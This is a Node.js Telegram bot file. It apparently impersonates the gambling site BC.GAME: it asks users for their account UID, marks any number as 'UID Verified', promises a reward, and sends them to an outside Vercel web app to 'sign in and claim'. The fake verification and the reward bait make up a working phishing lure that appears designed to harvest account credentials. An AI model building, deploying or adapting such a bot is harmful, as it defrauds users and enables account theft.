const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);

let webUrl = process.env.WEBAPP_URL || 'https://telegrambot-navy.vercel.app/';
if (!webUrl.endsWith('/')) webUrl += '/';

const startImg = `${webUrl}start_image.jpg`;
const uidImg = `${webUrl}uid_image.jpg`;

bot.start(async (ctx) => {
    try {
        await ctx.replyWithPhoto(startImg, {
            caption: `<b>Welcome to BC.GAME</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
            ])
        });
    } catch (e) {
        ctx.reply('Welcome! Please enter your User ID to continue.');
    }
});

bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    
    if (/^\d+$/.test(text)) {
        try {
            await ctx.replyWithPhoto(uidImg, {
                caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.webApp('Claim Reward', webUrl)]
                ])
            });
        } catch (e) {
            ctx.reply(`UID Verified: ${text}\nClick below to claim your reward.`, Markup.inlineKeyboard([
                [Markup.button.webApp('Claim Reward', webUrl)]
            ]));
        }
    } else {
        ctx.reply('Please enter a valid numeric User ID.');
    }
});

bot.launch().then(() => console.log('Bot is running...'));
